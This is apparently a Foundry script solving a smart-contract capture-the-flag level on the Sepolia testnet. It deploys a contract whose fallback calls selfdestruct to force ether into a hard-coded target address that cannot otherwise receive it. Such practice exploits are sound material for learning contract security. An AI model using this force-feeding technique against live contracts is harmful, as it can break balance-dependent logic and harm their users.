// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

// address of contract on sepolia :0x74ddE8c4e0234beE3F0477bc9B217dD7768Be3b3
contract selfDisctrut {
    fallback() external payable {
        selfdestruct(0x74ddE8c4e0234beE3F0477bc9B217dD7768Be3b3);
    }
}

contract forceSendEther is Script {
    function run() public {
        vm.startBroadcast();
        selfDisctrut self = new selfDisctrut();
        (bool ok, ) = address(self).call{value: 0.000001 ether}("");
        require(ok, "tx failed");
        console.log(0x74ddE8c4e0234beE3F0477bc9B217dD7768Be3b3.balance);
        vm.stopBroadcast();
    }
}
